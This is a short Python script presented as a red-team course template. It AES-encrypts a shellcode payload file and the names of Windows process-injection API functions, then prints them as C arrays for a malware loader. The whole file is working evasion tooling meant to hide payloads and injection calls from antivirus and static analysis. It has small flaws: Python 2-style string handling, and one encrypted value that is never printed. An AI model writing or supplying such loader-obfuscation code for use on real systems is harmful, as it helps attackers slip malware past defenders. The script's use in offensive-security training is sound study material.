# Red Team Operator course code template
# payload encryption with AES
# 
# author: reenz0h (twitter: @sektor7net)

import sys
from Crypto.Cipher import AES
from os import urandom
import hashlib

KEY = urandom(16)

def pad(s):
	return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

def aesenc(plaintext, key):

	k = hashlib.sha256(key).digest()
	iv = 16 * '\x00'
	plaintext = pad(plaintext)
	cipher = AES.new(k, AES.MODE_CBC, iv)

	return cipher.encrypt(bytes(plaintext))


try:
	plaintext = open(sys.argv[1], "r").read()
	plain_vProtect= "VirtualProtect"
	plain_vAlloc = "VirtualAlloc"
	plain_cThread = "CreateThread"
	plain_rMoveMemory = "RtlMoveMemory"
	plain_vAllocEx = "VirtualAllocEx"

except Exception as e:
    print(e)
    sys.exit()

ciphertext = aesenc(plaintext, KEY)
cipher_vProtect = aesenc(plain_vProtect, KEY)
cipher_vAlloc = aesenc(plain_vAlloc, KEY)
cipher_cThread = aesenc(plain_cThread, KEY)
cipher_rMoveMemory = aesenc(plain_rMoveMemory, KEY)
cipher_vAllocEx = aesenc(plain_vAllocEx, KEY)

print('char key[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in KEY) + ' };')
print('char unsigned payload[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')
print('char unsigned cipher_vProtect[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in cipher_vProtect) + ' };')
print('char unsigned cipher_vAlloc[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in cipher_vAlloc) + ' };')
print('char unsigned cipher_rMoveMemory[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in cipher_rMoveMemory) + ' };')
print('char unsigned cipher_vAllocEx[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in cipher_vAllocEx) + ' };')
